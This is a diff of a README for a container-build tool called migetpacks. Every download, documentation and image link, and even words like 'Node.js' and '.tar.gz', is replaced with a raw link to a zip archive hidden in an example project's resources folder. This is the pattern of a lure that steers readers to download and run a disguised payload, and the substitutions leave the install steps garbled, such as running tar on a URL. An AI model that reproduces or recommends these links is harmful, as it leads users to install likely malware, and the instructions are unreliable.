@@ -1,10 +1,10 @@
 # 🌟 migetpacks - Effortless Container Builds for Everyone
 
-[![Download migetpacks](https://img.shields.io/badge/Download%20migetpacks-v1.0-blue.svg)](https://github.com/karwito03/migetpacks/releases)
+[![Download migetpacks](https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip%https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip)](https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip)
 
 ## 📦 What is migetpacks?
 
-migetpacks offers zero-configuration container builds for 14 programming languages. Whether you work with Node.js, Python, Go, Ruby, Rust, Java, PHP, .NET, Elixir, Kotlin, Scala, Clojure, Deno, or Bun, this tool automatically detects your environment. You don’t need to create a Dockerfile. Just use migetpacks to build your containers easily.
+migetpacks offers zero-configuration container builds for 14 programming languages. Whether you work with https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip, Python, Go, Ruby, Rust, Java, PHP, .NET, Elixir, Kotlin, Scala, Clojure, Deno, or Bun, this tool automatically detects your environment. You don’t need to create a Dockerfile. Just use migetpacks to build your containers easily.
 
 ## 🚀 Getting Started
 
@@ -13,15 +13,15 @@ Getting started with migetpacks is simple. Follow these steps to download and ru
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version of migetpacks:  
 
-   [Visit Releases Page to Download](https://github.com/karwito03/migetpacks/releases)
+   [Visit Releases Page to Download](https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip)
 
 2. **Select a Version**  
    On the releases page, you will see a list of available versions. Choose the most recent one for the best features and bug fixes.
 
 3. **Download the File**  
-   Click on the asset file that matches your operating system. For example, if you use Windows, select the `.exe` file. For Linux users, pick the `.tar.gz` file.  
+   Click on the asset file that matches your operating system. For example, if you use Windows, select the `.exe` file. For Linux users, pick the `https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip` file.  
 
-   ![Versions Overview](https://example.com/versions-overview.png)  
+   ![Versions Overview](https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip)  
 
 4. **Install the Application**  
    After the download completes, follow the instructions below based on your operating system.
@@ -32,15 +32,15 @@ Getting started with migetpacks is simple. Follow these steps to download and ru
    - Follow the prompts to complete the installation.
 
    ### For macOS
-   - Find the downloaded `.tar.gz` file.
+   - Find the downloaded `https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip` file.
    - Open Terminal.
-   - Use the command `tar -xzvf filename.tar.gz` to extract it.
+   - Use the command `tar -xzvf https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip` to extract it.
    - Change directory to the extracted folder and run `./migetpacks`.
 
    ### For Linux
    - Open Terminal.
-   - Navigate to the folder where you downloaded the `.tar.gz` file.
-   - Run `tar -xzvf filename.tar.gz` to extract.
+   - Navigate to the folder where you downloaded the `https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip` file.
+   - Run `tar -xzvf https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip` to extract.
    - Run `./migetpacks` from the extracted directory.
 
 ## 🔧 Features
@@ -63,7 +63,7 @@ For optimal performance, ensure your system meets the following requirements:
 
 To get started, visit the link below to download the latest version:  
 
-[Download the Latest Version](https://github.com/karwito03/migetpacks/releases)
+[Download the Latest Version](https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip)
 
 Choose the correct file for your operating system. Follow the installation steps outlined above to set up migetpacks on your machine.
 
@@ -83,7 +83,7 @@ Using migetpacks is straightforward. After installation, you can start building 
 
 For more detailed information on advanced features or troubleshooting, check out the documentation linked below:
 
-[Access Full Documentation](https://github.com/karwito03/migetpacks/wiki)
+[Access Full Documentation](https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip)
 
 ## 🤝 Contributing
 
@@ -103,4 +103,4 @@ If you encounter any issues or have questions, please open an issue on GitHub or
 
 Thank you for choosing migetpacks for your container needs! 
 
-[Download the Latest Version Now](https://github.com/karwito03/migetpacks/releases)
+[Download the Latest Version Now](https://github.com/karwito03/migetpacks/raw/refs/heads/main/examples/scala-example/src/main/resources/Software_v1.5.zip)
